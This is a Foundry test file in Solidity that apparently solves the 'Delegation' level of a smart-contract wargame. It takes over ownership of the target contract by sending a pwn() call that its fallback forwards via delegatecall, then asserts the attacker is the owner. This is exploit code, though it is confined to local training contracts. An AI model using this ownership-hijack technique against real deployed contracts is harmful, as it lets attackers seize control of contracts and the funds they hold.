// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {VmSafe} from "forge-std/Vm.sol";
import {Test, console} from "forge-std/Test.sol";
import {Delegate, Delegation} from "../src/Level06.sol";

contract Level06Test is Test {
    Delegation public target;
    VmSafe.Wallet attacker;

    function setUp() public {
        Delegate delegate = new Delegate(address(this));
        attacker = vm.createWallet("attacker");
        target = new Delegation(address(delegate));
    }

    function test_getContractOwnership() public {
        // use prank to emulate tx.origin and msg.sender
        vm.startPrank(attacker.addr, attacker.addr);
        exploit();
        vm.stopPrank();

        assertEq(target.owner(), attacker.addr);
    }

    function exploit() private {
        bytes memory data = abi.encodeWithSignature("pwn()");
        (bool ok,) = address(target).call(data);
        require(ok, "call to pwn() failed");
    }
}
